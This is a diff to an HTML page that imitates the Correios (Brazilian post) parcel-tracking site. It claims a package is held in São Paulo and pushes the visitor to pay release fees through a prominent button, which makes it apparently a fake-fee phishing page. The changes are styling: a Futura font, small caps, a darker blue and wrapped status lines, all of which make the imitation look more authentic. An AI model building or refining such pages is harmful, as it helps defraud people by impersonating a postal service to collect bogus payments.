@@ -12,6 +12,16 @@
   <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
   <title>Correios | Rastreio</title>
 
+  <!-- Add Futura font -->
+  <style>
+    @font-face {
+      font-family: 'Futura No. 2';
+      src: url('https://fonts.cdnfonts.com/css/futura-no-2') format('woff2');
+      font-weight: normal;
+      font-style: normal;
+    }
+  </style>
+
   <style>
     /* ====== Top Bar amarela ====== */
     #top-bar {
@@ -257,6 +267,9 @@
       font-size: 18px;
       margin-bottom: 15px;
       text-align: left;
+      font-family: 'Futura No. 2', sans-serif;
+      font-variant: small-caps;
+      letter-spacing: 0.5px;
     }
     
     .status-label {
@@ -271,6 +284,18 @@
       font-weight: bold;
       text-align: left;
       font-size: 16px;
+      font-family: 'Futura No. 2', sans-serif;
+      font-variant: small-caps;
+      position: relative;
+      padding-left: 20px;
+    }
+    
+    .status-value:before {
+      content: "•";
+      position: absolute;
+      left: 0;
+      color: #FFD700;
+      font-size: 20px;
     }
     
     .normal-text {
@@ -301,7 +326,7 @@
       margin-top: 1.5rem;
       padding: 0.6rem 1.5rem;
       font-size: 1.1rem;
-      background-color: #007bff;
+      background-color: #003157;
       color: white;
       border: none;
       border-radius: 5px;
@@ -313,7 +338,7 @@
     }
 
     #btn-sim-sou-eu:hover, #btn-pagar:hover {
-      background-color: #0056b3;
+      background-color: #001a33;
     }
 
     /* Container para alinhar botão e link */
@@ -392,6 +417,19 @@
     .caixa-image img {
       max-width: 300px; /* Aumentado o tamanho */
       height: auto;
+    }
+    
+    /* Texto azul escuro */
+    .blue-dark-text {
+      color: #003157;
+    }
+    
+    /* Status info */
+    .status-info {
+      text-align: left;
+      margin: 10px 0;
+      font-size: 14px;
+      color: #333;
     }
   </style>
 </head>
@@ -479,7 +517,7 @@
       
       <div class="status-value">AGUARDANDO SUA CONFIRMAÇÃO</div>
       
-      <p style="color: #007bff;">Sua encomenda está retida na agência dos Correios em São Paulo</p>
+      <p class="blue-dark-text">Sua encomenda está retida na agência dos Correios em São Paulo</p>
       
       <p class="normal-text">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
       
@@ -489,10 +527,12 @@
       
       <div class="btn-container">
         <button id="btn-pagar">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
-        <p>Objeto aguardando sua confirmação</p>
-        <p>em Unidade de Fiscalização em São Paulo</p>
-        <p>Objeto em transferência - por favor aguarde</p>
-        <p>Objeto Postado</p>
+        <div class="status-info">
+          <p>Objeto aguardando sua confirmação</p>
+          <p>em Unidade de Fiscalização em São Paulo</p>
+          <p>Objeto em transferência - por favor aguarde</p>
+          <p>Objeto Postado</p>
+        </div>
         <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
       </div>
     </section>
